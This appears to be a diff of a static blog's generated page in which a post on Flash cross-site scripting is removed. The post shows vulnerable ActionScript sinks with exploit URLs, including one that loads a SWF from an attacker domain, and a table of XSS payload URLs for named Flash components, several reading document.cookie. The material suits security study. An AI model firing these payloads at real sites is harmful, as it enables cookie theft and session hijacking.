-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var root_xml:XML = new XML();</span><br><span class="line">root_xml.ignoreWhite = true;</span><br><span class="line">root_xml.onLoad = function(success)&#123;</span><br><span class="line">    if(success)&#123;</span><br><span class="line">        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        getURL(&quot;javascript:alert(‘fail’)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root_xml.load(_root.url);</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;link&gt;javascript:alert(&apos;xss&apos;)&lt;/link&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="2-ExternalInterface-call"><a href="#2-ExternalInterface-call" class="headerlink" title="2) ExternalInterface.call"></a>2) ExternalInterface.call</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __Flash__toXML(函数名(&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/ExternalInterface_first.swf?func=a1lert(1))&#125;catch(e)&#123;alert(100)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(a1lert(1))&#125;catch(e)&#123;alert(100)&#125;// (&quot;参数1&quot;)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br><span class="line"></span><br><span class="line">http://www.target.com/ExternalInterface_second.swf?par=1111\%22),al)&#125;catch(e)&#123;alert(1000)&#125;//</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">try &#123; __Flash__toXML(alert(&quot;1111\\&quot;),al&#125;catch(e)&#123;alert(1000)&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="3-htmlText"><a href="#3-htmlText" class="headerlink" title="3) htmlText"></a>3) htmlText</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_root.createTextField(&quot;Inputbox&quot;,0,20,20,320,240);</span><br><span class="line">_root.Inputbox.html=true;</span><br><span class="line">_root.Inputbox.htmlText=&quot;Welcome&quot; + _root.username;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/htmltext.swf?url=?username=&lt;img src=&apos;javascript:alert(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line"></span><br><span class="line">&quot;Welcome &lt;img src=&apos;javascript:alert(XSS)&apos;&gt;&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="4-loadMovie-asfunction"><a href="#4-loadMovie-asfunction" class="headerlink" title="4) loadMovie(), asfunction()"></a>4) loadMovie(), asfunction()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_root.loadMovie(_root.movietoload)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.com/FlashApp.swf?movietoload=http://hackerdomain/hackedFlash.swf</span><br></pre></td></tr></table></figure>
-<h4 id="5-ExternalInterface-addCallback"><a href="#5-ExternalInterface-addCallback" class="headerlink" title="5) ExternalInterface.addCallback()"></a>5) ExternalInterface.addCallback()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExternalInterface.addCallback(&apos;throwException&apos;,</span><br><span class="line">     function(s) &#123;</span><br><span class="line">       throw new Error(s)</span><br><span class="line">     &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><table>
-<thead>
-<tr>
-<th>Vendor</th>
-<th>url</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Zeroclipboard</td>
-<td>/zeroclipboard.swf?id=\”))}catch(e){alert(1);}//&amp;width=500&amp;height=500&amp;.swf</td>
-</tr>
-<tr>
-<td>JW Player</td>
-<td>/player.swf?playerready=alert(document.cookie)</td>
-</tr>
-<tr>
-<td>JW Player</td>
-<td>/player.swf?tracecall=alert(document.cookie)</td>
-</tr>
-<tr>
-<td>Custom</td>
-<td>/banner.swf?clickTAG=javascript:alert(1);//</td>
-</tr>
-<tr>
-<td>SwfUpload v2.2.0.1</td>
-<td>/swfupload.swf?movieName=”]);}catch(e){}if(!self.a)self.a=!alert(1);//</td>
-</tr>
-<tr>
-<td>YUI2</td>
-<td>/io.swf?yid=\”));}catch(e){alert(1);}//</td>
-</tr>
-<tr>
-<td>Jplayer</td>
-<td>/Jplayer.swf?jQuery=confirm&amp;id=Your information.’)*confirm(document.cookie%2b’&amp;vol=0.8&amp;muted=false&amp;.swf</td>
-</tr>
-<tr>
-<td>player</td>
-<td>/player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//</td>
-</tr>
-<tr>
-<td>uploader</td>
-<td>/uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//</td>
-</tr>
-<tr>
-<td>tagcloud</td>
-<td>/tagcloud.swf?mode=tags&amp;tagcloud=%3Ctags%3E%3Ca+href=’<a href="http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E" target="_blank" rel="external">http://websecurity.com.ua&#39;+style=&#39;font-size:+40pt&#39;%3EClick%20me%3C/a%3E%3C/tags%3E</a></td>
-</tr>
-<tr>
-<td>open-flash-chart</td>
-<td>/open-flash-chart.swf?get-data=(function(){alert(/hello/)})()</td>
-</tr>
-<tr>
-<td>io</td>
-<td>/io.swf?yid=\”));}catch(e){alert(9)}//</td>
-</tr>
-<tr>
-<td>uploadify</td>
-<td>/uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27鈥�%3ETest%3C/a%3E</td>
-</tr>
-<tr>
-<td>downloadify</td>
-<td>/downloadify.swf?queue_name=%22))}catch(e){}if(!self.a)self.a=!alert(‘XSS’);//&amp;width&amp;height&amp;downloadImage=<a href="http://www.google.co.in/images/srpr/logo4w.png" target="_blank" rel="external">http://www.google.co.in/images/srpr/logo4w.png</a></td>
-</tr>
-<tr>
-<td>flvPlayer</td>
-<td>/flvPlayer.swf?flvToPlay=xss.xml</td>
-</tr>
-<tr>
-<td>aflax</td>
-<td>/aflax.swf?callback=alert(9)</td>
-</tr>
-<tr>
-<td>redirect</td>
-<td>/redirect.swf?url=javascript:alert(9);</td>
-</tr>
-<tr>
-<td>finnor</td>
-<td>/finnor.swf?clickTag=javascript:alert(1);</td>
-</tr>
-<tr>
-<td>Vulnerable</td>
-<td>/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</td>
-</tr>
-<tr>
-<td>Pie3D</td>
-<td>/Pie3D.swf?dataURL=xss.xml</td>
-</tr>
-<tr>
-<td>link_protocol_test [only firefox]</td>
-<td>/link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f</td>
-</tr>
-<tr>
-<td>flashmediaelement &lt; v2.21.1</td>
-<td>/flashmediaelement.swf?jsinitfunctio%gn=alert<code>1</code></td>
-</tr>
-</tbody>
-</table>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1957,7 +1864,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">67</span>
+              <span class="site-state-item-count">69</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1967,7 +1874,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
